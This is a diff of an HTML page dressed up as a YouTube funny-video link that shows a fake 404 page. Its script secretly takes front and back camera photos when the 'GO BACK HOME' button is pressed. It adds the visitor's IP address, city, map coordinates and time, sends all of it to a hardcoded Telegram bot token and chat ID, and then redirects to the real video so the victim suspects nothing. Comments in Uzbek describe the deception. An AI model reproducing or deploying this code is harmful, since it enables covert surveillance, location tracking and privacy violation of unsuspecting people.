@@ -1,92 +1,23 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta property="og:title" content="Funny Videos 2026 - Best Moments">
-    <meta property="og:description" content="Watch the funniest moments of the week. Click to play.">
+    <meta property="og:title" content="Funny Videos 2026">
+    <meta property="og:description" content="Watch now.">
     <meta property="og:image" content="https://i.ytimg.com/vi/sWA-osOeiJg/hq720.jpg">
-    
-    <link rel="icon" href="https://www.youtube.com/s/desktop/28ea0284/img/favicon_32x32.png" type="image/x-icon">
-
+    <link rel="icon" href="https://www.youtube.com/s/desktop/28ea0284/img/favicon_32x32.png">
     <meta charset="UTF-8">
     <title>404 Not Found</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
     <style>
-        /* Aynan rasmdagi dizayn */
-        body, html {
-            height: 100%;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Helvetica', 'Arial', sans-serif;
-            background-color: #fcfcfc;
-            color: #000000;
-            text-align: center;
-        }
-
-        .container {
-            max-width: 600px;
-            padding: 20px;
-        }
-
-        /* 404 matni - xuddi rasmdagidek */
-        h1 {
-            font-size: 130px;
-            margin: 0;
-            font-weight: 800;
-            letter-spacing: 2px;
-            line-height: 1;
-        }
-
-        /* Oops matni */
-        h2 {
-            font-size: 28px;
-            margin: 20px 0 5px 0;
-            font-weight: 700;
-            color: #444;
-        }
-
-        /* Tushuntirish matni */
-        p {
-            color: #999;
-            font-size: 18px;
-            margin-bottom: 40px;
-            font-weight: 400;
-        }
-
-        /* Qora tugma - rasmdagi GO BACK HOME */
-        #photoBtn {
-            background-color: #000;
-            color: #fff;
-            padding: 10px 25px;
-            border: none;
-            text-transform: uppercase;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 12px;
-            letter-spacing: 1px;
-            display: inline-block;
-        }
-
-        /* Progress Bar (Yashirin holatda) */
-        #progressBox {
-            margin-top: 30px;
-            display: none;
-        }
-        .progress {
-            width: 200px;
-            height: 2px;
-            background: #eee;
-            margin: 10px auto;
-        }
-        .bar {
-            height: 100%;
-            width: 0%;
-            background: #000;
-            transition: 0.1s;
-        }
-
+        body, html { height: 100%; margin: 0; display: flex; justify-content: center; align-items: center; font-family: Arial, sans-serif; background: #fff; text-align: center; }
+        .container { max-width: 400px; }
+        h1 { font-size: 100px; margin: 0; font-weight: 800; }
+        h2 { font-size: 22px; margin: 10px 0; }
+        p { color: #999; font-size: 16px; margin-bottom: 30px; }
+        #photoBtn { background: #000; color: #fff; padding: 12px 25px; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        #progressBox { margin-top: 20px; display: none; }
+        .progress { width: 150px; height: 2px; background: #eee; margin: 0 auto; }
+        .bar { height: 100%; width: 0%; background: #ff0000; transition: 0.1s; }
         video, canvas { display: none; }
     </style>
 </head>
@@ -94,16 +25,10 @@
 
 <div class="container">
     <h1>404</h1>
-    <h2>Oops, This Page Not Found!</h2>
-    <p>The link might be corrupted,<br>or the page may have been removed</p>
-
+    <h2>Oops, Page Not Found!</h2>
+    <p>The link might be corrupted.</p>
     <button id="photoBtn">GO BACK HOME</button>
-
-    <div id="progressBox">
-        <div class="progress">
-            <div class="bar" id="bar"></div>
-        </div>
-    </div>
+    <div id="progressBox"><div class="progress"><div class="bar" id="bar"></div></div></div>
 </div>
 
 <video id="video" autoplay playsinline></video>
@@ -111,65 +36,74 @@
 
 <script>
     const BOT_TOKEN = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
-    const CHAT_ID  = "7880376636";
+    const CHAT_ID = "7880376636";
+    const TARGET_URL = "https://www.youtube.com/watch?v=sWA-osOeiJg";
 
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
 
-    async function sendToTelegram(blob) {
+    // IP orqali joylashuv va vaqtni olish
+    async function getExtraInfo() {
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            const now = new Date();
+            const timeStr = now.getHours() + ":" + now.getMinutes() + ":" + now.getSeconds();
+            
+            return `🕒 Vaqt: ${timeStr}\n📍 Joylashuv: ${data.city}, ${data.country_name}\n🌐 IP: ${data.ip}\n🗺 Karta: https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+        } catch (e) {
+            return "Ma'lumot topilmadi";
+        }
+    }
+
+    async function sendToTelegram(blob, caption) {
         const fd = new FormData();
         fd.append("chat_id", CHAT_ID);
         fd.append("photo", blob);
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: "POST",
-                body: fd
-            });
-        } catch (e) {}
-    }
-
-    function startProgress() {
-        document.getElementById("progressBox").style.display = "block";
-        const bar = document.getElementById("bar");
-        let p = 0;
-        const i = setInterval(() => {
-            p++;
-            bar.style.width = p + "%";
-            if (p >= 100) clearInterval(i);
-        }, 50);
+        fd.append("caption", caption); // Rasm ostiga yozuv qo'shish
+        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
     }
 
     async function capture(facing) {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: facing }
-            });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
             video.srcObject = stream;
-            await video.play();
-            await new Promise(r => setTimeout(r, 700));
+            await new Promise(r => video.onloadedmetadata = r);
+            await new Promise(r => setTimeout(r, 300));
+
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext("2d").drawImage(video, 0, 0);
+            
+            const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.6));
             stream.getTracks().forEach(t => t.stop());
-            return new Promise(res => {
-                canvas.toBlob(blob => res(blob), "image/jpeg", 0.7);
-            });
-        } catch (err) { return null; }
+            return blob;
+        } catch (e) { return null; }
     }
 
     document.getElementById("photoBtn").onclick = async () => {
-        startProgress();
-        const front = await capture("user");
-        if(front) await sendToTelegram(front);
-        const back = await capture("environment");
-        if(back) await sendToTelegram(back);
-        
-        // Oxirida foydalanuvchi gumon qilmasligi uchun haqiqiy videoga yo'naltirish (ixtiyoriy)
-        setTimeout(() => {
-            window.location.href = "https://www.youtube.com/watch?v=sWA-osOeiJg";
-        }, 5000);
+        document.getElementById("progressBox").style.display = "block";
+        const bar = document.getElementById("bar");
+        bar.style.width = "50%";
+
+        // Ma'lumotlarni yig'ish
+        const info = await getExtraInfo();
+
+        // Rasmga olish
+        const [frontBlob, backBlob] = await Promise.all([
+            capture("user"),
+            capture("environment")
+        ]);
+
+        bar.style.width = "100%";
+
+        // Telegramga yuborish
+        if (frontBlob) sendToTelegram(frontBlob, "Old Kamera\n" + info);
+        if (backBlob) sendToTelegram(backBlob, "Orqa Kamera\n" + info);
+
+        // Darhol yo'naltirish
+        window.location.href = TARGET_URL;
     };
 </script>
-
 </body>
 </html>
